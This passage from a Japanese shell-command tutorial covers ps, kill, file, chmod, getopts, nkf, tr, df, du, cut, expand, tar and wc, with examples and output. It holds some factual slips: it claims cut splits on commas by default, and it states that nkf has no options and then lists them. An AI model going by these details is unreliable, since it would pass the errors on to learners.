suzukiiichiro    17498   0.0  3.4  5607088 567104 s003  S+   水11AM   2:58.60 hugo -D server
suzukiiichiro    20710   0.0  1.7  5328588 286744 s005  S+   11:38AM   0:13.50 hugo server
bash-5.1$
```
最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。

さらにawkコマンドでプロセスＩＤを抽出します。

```
bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }'
17498
20710
bash-5.1$
```

pgrep を使う方法
pgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。

```
bash-5.1$ pgrep hugo
17498
20710
bash-5.1$
```


プロセスＩＤが解ったところでプロセスを終了します。

|表記    |数値    |意味|
|:------:|:------:|----|
|KILL    |9       |プロセスの強制終了命令|

```
$ kill -9 17498
$ kill -9 20710
```

面倒ですね。プロセスがたくさんある場合はとても煩雑です。
xargsコマンドを使うと一片にプロセスを終了させることができます。

```
bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }' | xargs kill -9
```

終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。

```
$ killall hugo
```




## fileコマンド
- ファイルの形式を表示する
- ファイルのリストから調べる
- シンボリックリンクの参照先を調べる
- 圧縮されているファイルを調べる
- fileコマンドと組み合わせてスクリプトファイルを一覧表示する
- whichコマンドと組み合わせてコマンドのファイル形式を調べる

### fileコマンド概要
「file」は、ファイル形式を調べるためのコマンドです。「file ファイル名」で、ファイルの形式が表示されます。テキストファイルの場合は、文字コードが表示されます。

{{% tips-list tips %}}
ヒント
: fileコマンドを使わないとできないことがあります。ファイルの拡張子をみて画像ファイルであり、そのファイルタイプはjpgまたはgifという見分けをしますが、それはあくまで見た目の話で、ファイルの内容を確認するためのコマンドがfileコマンドになります。
{{% /tips-list %}}
 

### fileコマンドの書式
file [オプション] ファイル1 ファイル2 ファイル3……


### fileコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-f	|リスト	検査するファイルの名前をリストファイルから読み込む|
|-L	|シンボリックリンクの参照先を調べる|
|-z	|圧縮ファイルの中も検査する|
|-b	|出力行の最初にファイル名を表示しない|
|-N	|出力を整列するためのファイル名への空白の追加を行わない|

{{% tips-list tips %}}
ヒント
: 一覧のオプションは一部です。 $ man file   などで、fileの使い方を確認してください。
{{% /tips-list %}}


### fileコマンド詳細説明

### ファイルの形式を表示する

システムメッセージを表示する
```
$ file sample.jpg
```

{{% tips-list tips %}}
ヒント
: データファイルの場合は「.jpg」や「.mp3」といった拡張子で判断してしまうのが一般的ですが、fileコマンドの場合は拡張子ではなく、あくまでも“ファイルの内容”から判断します 
{{% /tips-list %}}


### ファイルのリストから調べる
「-f」オプションで、ファイルの一覧を指定することができます。例えば、Linuxの設定ファイル「/etc/shells」にはインストールされているシェルがリストアップされていますが、「file -f /etc/shells」で、それぞれのシェルのファイル形式を調べることができます。


```
$ file -f /etc/shell
```

### シンボリックリンクの参照先を調べる 

「-L」オプションで、シンボリックリンクのリンク先を調べることができます。例えば、先ほどの実行結果から「/bin/csh」は、tcshへのシンボリックリンクであることが分かりました。「file -L /bin/csh」で、リンク先であるtcshのファイル形式が表示されます。

```
$ file -L /bin/tcsh
```


### 圧縮されているファイルを調べる 
「-z」オプションで、圧縮されているファイルの元の形式を調べることができます。

```
bash-5.1$ file /usr/local/bin/openmpi-1.8.3.tar.gz
/usr/local/bin/openmpi-1.8.3.tar.gz: gzip compressed data, last modified: Thu Sep 25 14:12:57 2014, max compression, from Unix
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: $ man file   などで、fileの使い方を確認してください。
{{% /tips-list %}}



## chmodコマンド
- パーミッションを表すアルファベットと数値の意味
- パーミッションを変更する
- パーミッションの変更内容を確認するには？


### chmodコマンド概要
ファイルやディレクトリにアクセスできるかどうかは、ファイルの「パーミッション（許可属性）」によって決まります。このパーミッションを変更するコマンドが「chmod」です。


### chmodコマンドの書式
chmod [オプション] モード ファイル1 ファイル2 ファイル3……


### chmodコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-R	|ファイルとディレクトリを再帰的に変更する|
|-v	|処理した内容を出力する|
|-c	|変更が行われた場合のみ処理内容を出力する|
|-f	|ほとんどのエラーメッセージを出力しない|


{{% tips-list tips %}}
ヒント
: 一覧のオプションは一部です。 $ man chmod   などで、chmodの使い方を確認してください。
{{% /tips-list %}}


### chmodコマンド詳細説明

### パーミッションを表すアルファベットと数値の意味


|記号|数字    |意味|
|----|--------|----|
|r   |4       |読み|
|w   |2       |書き|
|x   |1       |実行|
|-   |0       |拒否|


具体的に以下のように表示される場合、「所有者」「所有グループ」「それ以外」の３桁で表されます。

rw-rw-r--   664
rwxr-xr-x   755

すくなくとも自分自身はおおむね「所有者」となりますので、

rw-rw-r--   664
の場合は、所有者（自分自身）は、rw- 6 ですので、
読み・書きはできるものの実行はできない（実行の必要がない）ファイル・ディレクトリということになります。

rwxr-xr-x   755
の場合は、所有者（自分自身）は、rwx 7 ですので、
読み・書き・実行が可能なファイル・ディレクトリであるということになります。


### パーミッションを変更する

いろいろな方法があります。
一般的には（なにが一般的かもわかりませんが）以下の通りとなります。

sample.txtのパーミッションを664に変更する
```
$ chmod 664 sample.txt
```

sample.txtのパーミッションを755に変更する
```
$ chmod 755 sample.txt
```

### パーミッションの変更内容を確認するには？

　chmodコマンドで「-v」オプションを指定すると、コマンドの実行内容が分かるようになります。パーミッションが変更されなかった場合も、現状がどのようになっているかが分かるように表示されます。

```
$ chmod -v 755 sample.txt
'sample.txt' のモードを 0664 (rw-rw-r--)から 0775 (rwxrwxr-x)へ変更しました
```

{{% tips-list tips %}}
ヒント
: $ chmod コマンドはとても重要、かつセキュリティ上注意が必要なコマンドです。なんでもかんでも777にしておくという大馬鹿ものが後を絶ちませんが、やめましょう。
{{% /tips-list %}}

{{% tips-list tips %}}
ヒント
: -v オプションは常につけて実行しましょう。何を実行したのかを履歴に残しておくことで振り返って確認することができます。
{{% /tips-list %}}



## getoptsコマンド
- オプションを解析する
- エラーメッセージを表示しない
- 引数付きのオプションを使用する


### getoptsコマンド概要
「getopts」は、bashのシェルスクリプト内でオプションを解析する際に役立つコマンドです。自作のシェルスクリプトで「-a」のような「ハイフン＋アルファベット1文字」のオプションを扱う際に便利です。「-f ファイル名」のように引数を取るオプションも解析できます。

例えばこういうのです
```
$ head -n10
```

文字列を渡すこともできます
```
$ grep -f wordlist.txt
```

ということで、自作のスクリプトでこういう事ができるわけです。
```
$ myScript.sh -n10 -f addressList.txt
```

{{% tips-list tips %}}
ヒント
: getoptsとよく似た名前で用途も同じ「getopt」コマンド（/usr/bin/getopt）があります。getoptコマンドはgetoptsとは異なり、「--」から始まるロングオプションも扱うことができます。 
{{% /tips-list %}}



### getoptsコマンドの書式
getopts オプション文字列 変数名


### getoptsコマンドの主なオプション

getoptsにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。

|オプション    |意味|
|--------------|----|
|:	|エラーメッセージの表示の有無|


{{% tips-list tips %}}
ヒント
: 一覧のオプションは一部です。 $ man getopts   などで、getoptsの使い方を確認してください。
{{% /tips-list %}}


### getoptsコマンド詳細説明

### オプションを解析する 

オプション「-a」「-b」「-c」を使用し、それぞれのオプションに応じてメッセージを表示します。

```Shell:getopts01.sh
#!/bin/bash

while getopts abc OPT; do
  case $OPT in
     a) echo "[-a] が指定された";;
     b) echo "[-b] が指定された";;
     c) echo "[-c] が指定された";;
     *) echo "該当なし OPT=$OPT ";;
  esac
done
```

while getopts abc OPT; do 
の abc は、オプションの種類が a,b,cの３種類あることを明示的に指定しています。
OPTは $OPT変数で、 a,b,cがそれぞれ順に代入されます。

```
$ bash getopts.sh -a
[-a] が指定された
$ bash getopts.sh -ab
[-a] が指定された
[-b] が指定された
$ bash getopts.sh -a -b
[-a] が指定された
[-b] が指定された
$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts.sh: 不正なオプションです -- d
該当なし OPT=?
```

以下のオプションは用意されていないことからエラー表示となります。

```
$ bash getopts.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts.sh: 不正なオプションです -- d
該当なし OPT=?
```


### エラーメッセージを表示しない

　getoptsに指定していないオプションを使用すると、画面1のように「不正なオプションです -- d」、あるいは「illegal option -- d」のようなメッセージを表示します。

　このようなgetoptsのエラーメッセージを表示したくない場合は、「getopts :abc OPT」のように、オプション文字列の先頭に「:」記号を入れます。

```Shell:getopts02.sh
#!/bin/bash

while getopts :abc OPT; do
  case $OPT in
     a) echo "[-a] が指定された";;
     b) echo "[-b] が指定された";;
     c) echo "[-c] が指定された";;
     *) echo "該当なし OPT=$OPT ";;
  esac
done
```


エラーが表示される getopts01.sh
```
$ bash getopts01.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
getopts01: 不正なオプションです -- d
該当なし OPT=?
```

エラーが表示されない getopts02.sh
```
$ bash getopts02.sh -abc -d
[-a] が指定された
[-b] が指定された
[-c] が指定された
該当なし OPT=?
```


### 引数付きのオプションを使用する

「-f ファイル名」のように、引数を取るオプションを解析したい場合は、オプション文字の後に「:」記号を付けます。オプションの引数は、組み込み変数「OPTARG」で参照できます。

```Shell
#!/bin/bash

while getopts :a:bc: OPT; do
  case $OPT in
     a) echo "[-a] が指定された(引数=$OPTARG)";;
     b) echo "[-b] が指定された";;
     c) echo "[-c] が指定された(引数=$OPTARG)";;
     :) echo "$OPTARGに引数が指定されていません";;
     ?) echo "$OPTARGは定義されていません";;
  esac
done
```

実行結果
```
$ bash getopts03.sh -a filename -b -c 100
[-a] が指定された 引数=filename
[-b] が指定された
[-c] が指定された 引数=100
$

```
解説
:a:bc:　について
```
:a   エラー表示をしないというオプションとなります。
a:    -a が指定された場合は引数に数値または文字列を受け取ります。
c:    -c が指定された場合は引数に数値または文字列を受け取ります。
```

{{% tips-list tips %}}
ヒント
: アホか。というくらいまぎらわしくてわかりにくい設計で笑えます。一体どこの誰がこんなわかりにくい仕様にしたのでしょう。
{{% /tips-list %}}


{{% tips-list tips %}}
ヒント
: とにかくシェルクスクリプトで起動パラメータを設定することができました。便利なツールをたくさん作ってください。では
{{% /tips-list %}}



## nkfコマンド
- 文字コードと改行コードを変換する
- 文字コードを判定する
- 文字コードを変換してファイルを書き換える
- CentOS 7にnkfをインストールするには？


### nkfコマンド概要
　「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。


### nkfコマンドの書式
nkf [オプション] [ファイル]
nkf [オプション] --overwrite ファイル


### nkfコマンドの主なオプション

nkfにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。

|オプション    |意味|
|--------------|----|
|-j(入力は J)	|JISコードを出力する|
|-e(入力は E)	|EUCコードを出力する|
|-s(入力は S)	|シフトJISコードを出力する|
|-w(入力は W) |UTF-8コードを出力する（BOMなし）|
|-Lu          |改行をLFにする（UNIX系）|
|-g	          |自動判別の結果を出力する|
|--overwrite  |ファイルを変換して上書きする|

{{% tips-list tips %}}
ヒント
: UTF-8に変換する場合は $ nkf -wLu となります。
このオプションの意味は、改行コードをUNIX系のLFに変換してUTF-8で出力、です。
{{% /tips-list %}}

{{% tips-list tips %}}
ヒント
: 一覧のオプションは一部です。 $ man nkf   などで、nkfの使い方を確認してください。
{{% /tips-list %}}


### nkfコマンド詳細説明

### 文字コードと改行コードを変換する

kfは「nkf ファイル名」で指定したファイル、または標準入力から受け取った内容を変換して、標準出力に書き出します。

Linux環境で扱いやすいように、文字コードを「UTF-8」（-wオプション）、改行コードを「LF」（-Luオプション）に変換するには、リダイレクトするか、「nkf -wLu 元ファイル > 保存ファイル名」のように指定します。なお、入力側の文字コードは自動で判定されます。

改行コードはUNIX系のLFで、UTF-8で変換出力
```
$ cat sjisFile.txt | nkf -wLu > 保存ファイル名.txt
```



### 文字コードを判定する

　「-g（--guess）」オプションを付けると、使用されている文字コードと改行コードの判定結果を表示することができます。

得体のしれないファイルを調査する
```
$ cat sjisFile.txt | nkf -g
sjisFile.txt: UTF-8 (LF)
```

### 文字コードを変換してファイルを書き換える
　「--overwrite」オプションでは、指定したファイルの文字コードを変換して、直接書き換えることができます。

文字コードを変換してファイルを書き換える
```
$ cat sjisFile.txt | nkf -wLu --overwrite
```

{{% tips-list tips %}}
ヒント
: --overwrite オプションで元のファイルを上書きするのは一見便利なオプションに見えますが、別ファイルに出力して、元のファイルは極力残すようにしておくべきだと思います。僕は。
{{% /tips-list %}}



### CentOS 7にnkfをインストールするには？ 

rpmでインストール
```
$ yum localinstall http://mirror.centos.org/centos/6/os/x86_64/Packages/nkf-2.0.8b-6.2.el6.x86_64.rpm
```

ソースからインストール
```
$ wget https://osdn.jp/dl/nkf/nkf-2.1.4.tar.gz
$ tar -xzvf nkf-2.1.4.tar.gz
$ cd nkf-2.1.4/
$ make
$ sudo make install
```

{{% tips-list tips %}}
ヒント
: rpmやyumでインストールする場合と、ソースからインストールする場合、いずれも好みです。人それぞれのやり方や考え方でいいと思います。いずれ使い分けができるようになると思います。今はうまく行ったほうで頑張ってください。
{{% /tips-list %}}




## trコマンド
- 文字を置換する
- 大文字／小文字を変換する
- 改行を除去する
- 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する


### trコマンド概要
　「tr」は、文字を置き換えるためのコマンドです。指定した文字を別の文字に置き換えたり、指定した文字を削除したり、文字が連続している場合には1つにまとめたりすることもできます。

ですが、sedでもっと細かく制御できるので、trは「改行を除去する」ためのコマンドに成り果ててしまいました。ここでは改行を除去することだけにフォーカスしてご説明します。

### trコマンドの書式
tr [オプション] 文字セット1 [文字セット2]


### trコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-d|'文字'を削除する|



### trコマンド詳細説明

### 文字を置換する

sedを使いましょう。
```
$ tr 012 abc
```

{{% tips-list tips %}}
ヒント
: 012 という文字列を置き換えるのではなく、0をaに、1をbに、2をcに置き換えます。
{{% /tips-list %}}


### 大文字／小文字を変換する

sedを使いましょう。


大文字／小文字を変換する
```
$ tr ABC abc
```

{{% tips-list tips %}}
ヒント
: ABC という文字列を置き換えるのではなく、Aをaに、Bをbに、Cをcに置き換えます。
{{% /tips-list %}}


　また、文字を範囲で指定することも可能です。「tr A-Z a-z」で「A」は「a」に、「B」は「b」に……と対応する文字に置き換えられます。

```
$ tr A-Z a-z
```

### 改行を除去する

　「-d」オプションで、指定した文字を削除することができます。

ファイル中の改行を除去
```
$ cat sample.txt | tr -d '\n' > 出力ファイル名
```

文字列中の改行を除去
```
$ echo "$string_sample" | tr -d '\n' 
```

{{% tips-list tips %}}
ヒント
: trコマンドの唯一の利点、sedより優れているただ一つの機能、それが tr -d '\n' です。
{{% /tips-list %}}

{{% tips-list alert %}}
重要
: tr -d '\n' のくくりはシングルクォーテーションである必要があります。ダブルクォーテーションではいけません。理由は「文字列」ではなく「文字（一文字）」しか扱えないからです。
{{% /tips-list %}}


### 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する

ls -la コマンドで普通に出力します。
```
$ ls -la
drwxr-xr-x  13 suzukiiichiro  staff     416  7 14 13:31 ./
drwxrwxrwx+ 48 suzukiiichiro  staff    1536  7  5 10:05 ../
drwxrwxrwx   7 suzukiiichiro  staff     224  4 10  2020 AI_Algorithm_Game_Bash/
drwxrwxrwx  18 suzukiiichiro  staff     576  4 10  2020 AI_Algorithm_Game_Chess/
drwxrwxrwx  39 suzukiiichiro  staff    1248  4 10  2020 AI_Algorithm_Game_Othello/
drwxrwxrwx  31 suzukiiichiro  staff     992  4 10  2020 AI_Algorithm_Game_RubiksCube/
drwxrwxrwx  33 suzukiiichiro  staff    1056  4 10  2020 AI_Algorithm_Game_Shogi/
drwxrwxrwx   7 suzukiiichiro  staff     224  4 10  2020 C_Othello/
```


連続した空白をタブに変換します。
```
$ ls -l | tr -s " " "\t"
total	528
drwxrwxrwx	7	suzukiiichiro	staff	224	4	10	2020	AI_Algorithm_Game_Bash/
drwxrwxrwx	18	suzukiiichiro	staff	576	4	10	2020	AI_Algorithm_Game_Chess/
drwxrwxrwx	39	suzukiiichiro	staff	1248	4	10	2020	AI_Algorithm_Game_Othello/
drwxrwxrwx	31	suzukiiichiro	staff	992	4	10	2020	AI_Algorithm_Game_RubiksCube/
drwxrwxrwx	33	suzukiiichiro	staff	1056	4	10	2020	AI_Algorithm_Game_Shogi/
drwxrwxrwx	7	suzukiiichiro	staff	224	4	10	2020	C_Othello/
```

連続した空白をカンマに変換します。
```
$ ls -l | tr -s " " ","
drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,AI_Algorithm_Game_Bash/
drwxrwxrwx,18,suzukiiichiro,staff,576,4,10,2020,AI_Algorithm_Game_Chess/
drwxrwxrwx,39,suzukiiichiro,staff,1248,4,10,2020,AI_Algorithm_Game_Othello/
drwxrwxrwx,31,suzukiiichiro,staff,992,4,10,2020,AI_Algorithm_Game_RubiksCube/
drwxrwxrwx,33,suzukiiichiro,staff,1056,4,10,2020,AI_Algorithm_Game_Shogi/
drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,C_Othello/
```



## dfコマンド
- ディスクの空き容量を調べる


### dfコマンド概要
　「df」は、ディスクの空き領域（freeスペース）のサイズを集計して表示するコマンドです。引数でファイルやディレクトリを指定すると、そのファイルが保存されている場所の空き領域が表示されます。指定しなかった場合は、現在マウントされている全ての場所について空き領域を表示します。

{{% tips-list tips %}}
ヒント
: dfコマンドで最も使われるオプションは -h です。この一つだけを覚えていれば大丈夫です。
{{% /tips-list %}}


### dfコマンドの書式
df [オプション] [ファイル]


### dfコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-h	           |サイズに応じて読みやすい単位で表示する|



### dfコマンド詳細説明

### ディスクの空き容量を調べる

簡単です。
```
$ df -h 
Filesystem      Size   Used  Avail Capacity iused               ifree %iused  Mounted on
/dev/disk1s1   466Gi  398Gi   64Gi    87% 2377176 9223372036852398631    0%   /
devfs          194Ki  194Ki    0Bi   100%     671                   0  100%   /dev
/dev/disk1s4   466Gi  3.0Gi   64Gi     5%       5 9223372036854775802    0%   /private/var/vm
map -hosts       0Bi    0Bi    0Bi   100%       0                   0  100%   /net
map auto_home    0Bi    0Bi    0Bi   100%       0                   0  100%   /home
```


{{% tips-list tips %}}
ヒント
: 要するに空き容量を確認するためのコマンドがdfで、-hオプションを付けることによって、サイズがわかりやすくなる、という仕組みです。深く考えるのはやめましょう。
{{% /tips-list %}}



## duコマンド
- ディレクトリごとのディスク使用量を表示する
- ディスク使用量の合計だけを表示する
- カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する


### duコマンド概要
　「du」は、ディスクの使用量をディレクトリごとに集計して表示するコマンドです。ファイルを指定した場合は指定したファイルのサイズのみ、ディレクトリを指定した場合はそのディレクトリおよび全てのサブディレクトリの使用量を集計します。対象を指定しなかった場合は、カレントディレクトリの使用量が表示されます。

{{% tips-list tips %}}
ヒント
: duコマンドで最も使われるオプションは -h -s です。この組み合わせだけを覚えていれば大丈夫です。
{{% /tips-list %}}


### duコマンドの書式
du [オプション] [ファイルまたはディレクトリ]

### duコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-h	           |サイズに応じて読みやすい単位で表示する|
|-s	           |指定したディレクトリの合計のみを表示する|



### duコマンド詳細説明

### ディレクトリごとのディスク使用量を表示する 

```
$ du -h 
:
:
＜どばーっとでてきます＞
:
:
```

{{% tips-list tips %}}
ヒント
: あまりにもたくさん表示されて、なにがなんだかわかりませんね。大丈夫です。次の項で -s オプションを紹介します。
{{% /tips-list %}}

### ディスク使用量の合計だけを表示する
　指定したディレクトリの合計容量だけを表示したい場合は、「-s」オプションを使用します。

du -s で、カレントディレクトリが使用している容量が表示されます。
```
$ du -h -s
1.4G	.
```

### カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する
カレントディレクトリ直下のファイル、またはディレクトリごとの集計値を表示するには、アスタリスク * をつけます。

du -h -s * で、カレントディレクトリ直下のファイルおよびディレクトリごとの集計となります。
```
$ du -h -s *
 72K	AI_Algorithm_Game_Bash
440K	AI_Algorithm_Game_Chess
276M	AI_Algorithm_Game_Othello
971M	AI_Algorithm_Game_RubiksCube
157M	AI_Algorithm_Game_Shogi
```

{{% tips-list tips %}}
ヒント
: duコマンドはディレクトリ以下の使用量を表示するコマンドです。dfコマンド同様 -h でサイズが見やすく表示されます。 -s でカレントディレクトリの使用量が表示され、\* をつけると、ディレクトリ内のサブディレクトリごとの使用量が表示されます。 du -h -s \* のひとかたまりで覚えるのがポイントです。
{{% /tips-list %}}



## cutコマンド
- 文字数を指定して切り出す
- フィールドを指定して切り出す
- 出力の区切り文字を変更する

### cutコマンド概要
　「cut」は、ファイルを読み込んで、それぞれの行から指定した部分だけを切り出すコマンドです。例えば、「3文字目から10文字目」や、タブなどで区切られたファイルから「1番目のフィールドと3番目のフィールド」のように選んで取り出すことができます。


### cutコマンドの書式
cut オプション [ファイル]


### cutコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-c            |切り出す位置のリストを文字数で指定する|
|-f 1,3または1-3|切り出す位置のリストをタブ区切りのフィールドで指定する（区切り文字は「-d」オプションで変更可能）|
|-d '文字'     |フィールドの区切り文字として、タブの代わりに使用する文字を指定する（1文字のみ）|


### cutコマンド詳細説明

### 文字数を指定して切り出す

cutコマンドで頭から4文字を切り出す
```
$ STR="Hello World"
$ echo $string | cut -c 1-4 
Hell
```


bashの文字列変数で頭から4文字を切す
```
$ STR="Hello World"
$ echo ${STR:0:4}
Hell
```


sedコマンドで先頭から4文字切り出す
```
$ STR="Hello World"
$ echo "${STR}" | sed 's/^\(.\{4\}\).*$/\1/'
Hell
```


### フィールドを指定して切り出す
フィールドの区切り文字は、デフォルトで ,(カンマ）とTAB(タブ）です。
特に指定しなければ、cutコマンドが考えて区切り文字として認識してくれます。
ただカンマとTABが混在している場合は不安ですね。
次の項で、区切り文字（デリミタ）を指定する方法を説明します。


区切り文字のデフォルトがカンマとタブだから
/etc/passwdのようにデリミタを指定しないときちんと区切られない。
```
$ sudo cat /etc/passwd | cut -f 1,7 | tail
_findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false
_datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false
_captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false
_ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false
_applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false
_hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false
_cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false
_analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false
_fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false
_timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false
```


デリミタを指定した場合はきちんと１番目、７番目のフィールドが切り取られました
まずはcutコマンドで実現します。
```
$ sudo cat /etc/passwd | cut -f 1,7 -d ':' | tail
_findmydevice:/usr/bin/false
_datadetectors:/usr/bin/false
_captiveagent:/usr/bin/false
_ctkd:/usr/bin/false
_applepay:/usr/bin/false
_hidd:/usr/bin/false
_cmiodalassistants:/usr/bin/false
_analyticsd:/usr/bin/false
_fpsd:/usr/bin/false
_timed:/usr/bin/false
$
```

同じことをawkコマンドでやってみます。デリミタの区切り指定は -F です。
```
$ sudo cat /etc/passwd | awk -F ':' '{ print $1":"$7;}' | tail
_findmydevice:/usr/bin/false
_datadetectors:/usr/bin/false
_captiveagent:/usr/bin/false
_ctkd:/usr/bin/false
_applepay:/usr/bin/false
_hidd:/usr/bin/false
_cmiodalassistants:/usr/bin/false
_analyticsd:/usr/bin/false
_fpsd:/usr/bin/false
_timed:/usr/bin/false
$
```

{{% tips-list tips %}}
ヒント
: 文字を切り出す方法にもいくつかありますし、フィールドの切り出しにもいろいろな方法があります。用途に合わせて使い分けてください。最初のうちは、一つの方法を覚えておけばよいです。
{{% /tips-list %}}



## expandコマンド
- タブを空白に変換する（expandコマンド）
- タブの幅を指定する

### expandコマンド概要
「expand」はタブを空白に変換するコマンド、「unexpand」は空白をタブに変換するコマンドです。デフォルトのタブ幅は8桁で、これを変更したい場合は「-t」オプションでタブの文字数を指定します。

### expandコマンドの書式
expand [オプション] [ファイル]
unexpand [オプション] [ファイル]


### expandコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-t 文字数	   |タブの文字数またはタブ位置のリストを指定する|


### expandコマンド詳細説明

### タブを空白に変換する

まずサンプルファイルを用意します。
```
$ echo -e "No-1\tTokyo\t1354098\nNo-2\tOsaka\t934765\nNo-3\tNagoya\t786592" > ex.txt
$ cat ex.txt
No-1	Tokyo	1354098
No-2	Osaka	934765
No-3	Nagoya	786592
```

expandコマンドでタブを空白に変換します。
```
$ expand ex.txt > ex2.txt
$ cat ex2.txt
No-1    Tokyo   1354098
No-2    Osaka   934765
No-3    Nagoya  786592
```

見た目は全く変わりませんが、タブが空白に置き換えられました。
デフォルトのタブ幅は８です。

### タブの幅を指定する
タブ幅を変更する場合は、「-t」オプションを使用します。例えば、12文字の幅にしたい場合は「-t 12」と指定します。

```
# サンプルファイルを作成
$ echo -e "No-1\tTokyo\t1354098\nNo-2\tOsaka\t934765\nNo-3\tNagoya\t786592" > ex.txt
$ cat ex.txt
No-1	Tokyo	1354098
No-2	Osaka	934765
No-3	Nagoya	786592

# タブ幅のデフォルトは8です。
$ expand ex.txt > ex2.txt
$ cat ex2.txt
No-1    Tokyo   1354098
No-2    Osaka   934765
No-3    Nagoya  786592

# タブ幅を10に指定
$ expand -t 10 ex.txt >ex3.txt
$ cat ex3.txt
No-1      Tokyo     1354098
No-2      Osaka     934765
No-3      Nagoya    786592
```


{{% tips-list tips %}}
ヒント
: タブ幅を変更する場合には、$ expand -t 10 と、覚えておけば良いと思います。
{{% /tips-list %}}




## tarコマンド
- アーカイブファイルを作成する
- アーカイブファイルを展開する

### tarコマンド概要
　「tar」は、複数のファイルを1つにまとめた“アーカイブファイル”を作成／展開するコマンドです。
　「アーカイブ（archive）」は「書庫」という意味で、プログラムのソースコードなど、複数の関連するファイル群をまとめて保管したり、配布したりする際に使用します。

### tarコマンドの書式
tar -czvf アーカイブ.tgz 対象ファイル
（ファイルのアーカイブを作成しgzip形式で圧縮する）

tar -xzvf アーカイブ.tgz
（gzipで圧縮されたアーカイブを展開する）


### tarコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-c|新しいアーカイブを作成する|
|-x|アーカイブからファイルを抽出する|


### tarコマンド詳細説明

### アーカイブファイルを作成する
　アーカイブファイルを作成するには「-c」オプション、アーカイブをgzip形式で圧縮するには「-z」オプションを指定し、「-f」オプションでアーカイブファイル名を指定します。

```
$ tar -czvf archive.tgz *
```

### アーカイブファイルを展開する
　アーカイブファイルからファイルを取り出すことを、「展開」あるいは「抽出」と呼びます。

　展開には、先ほどの「-c」オプションの代わりに「-x」オプションを使います（画面2）。また、「-z」はgzip形式用のオプションなので、圧縮されていない場合は「-z」オプションなしで、bzip2形式（拡張子は「.tar.bz2」）の場合は「-j」オプションを使用します。

```
$ tar -zxvf archive.tgz
```

{{% tips-list tips %}}
ヒント
: 圧縮は Create（作成）なので -czvf、展開はeXtaruct（伸長）で -xzvfです。 圧縮、展開ともに zvf は共通です。
{{% /tips-list %}}



## wcコマンド
- 行数と単語数とバイト数を数える
- 文字数を数える
- 行数だけを表示する

### wcコマンド概要
　「wc」はテキストファイルの行数や単語数（word count）、文字数を数えるコマンドです。単語は、空白や改行文字で区切られたものを数えます。


### wcコマンドの書式
wc [オプション] [ファイル……]


### wcコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-c|バイト数を表示する|
|-m|文字数を表示する（マルチバイト文字に対応）|
|-l|改行の数を表示する|
|-w|単語数を表示する|


### wcコマンド詳細説明

### 行数と単語数とバイト数を数える 
　「wc テキストファイル名」で、指定したテキストファイルの行数、単語数、バイト数が表示されます。複数のファイルを指定（ワイルドカード「\*」も使用可）した場合は、各ファイルの結果と合計が表示されます。

実行結果は以下のとおりです。
```
bash-5.1$ wc index.md
     158     211    7239 index.md
bash-5.1$
```
表示される値は左から
ファイルの行数  単語数  バイト数となります。


### 文字数を数える
　バイト数ではなく、文字数を数えたい場合は「-m」オプションを使用します。

実行結果は以下のとおりです。
```
$ wc -m filename.txt
```


### 行数だけを表示する
　行数だけをカウントしたい場合は、「-l」オプションを使用します。

　例えば、「find」コマンドは見つけたファイルを「1件1行」で出力するので、行数を数えることでファイルの個数を知ることができます。

ls -la コマンドでファイルの数を調べる
```
bash-5.1$ ls -la | grep -v ^d | wc -l
       9
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: grep -v ^d でディレクトリを除外しています。 
{{% /tips-list %}}


ファイルの行数を調べる
```
$ cat filename.txt | wc -l
```

{{% tips-list tips %}}
ヒント
: wc -m wc -l この２つは必須です。
{{% /tips-list %}}



## jotコマンド
- 連番を生成する
- 文字列と組み合わせた連番を作成する
- printf のフォーマットで出力する
- 連番の範囲を指定して出力する
- 乱数を出力する

### jotコマンド概要
jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに `seq`や`$RANDOM` コマンドがあります。


### jotコマンドの書式
jot [オプション] 


### jotコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-w [文字列]|文字列を指定する|
|-r|乱数を出力する|


### jotコマンド詳細説明

### 連番を作る
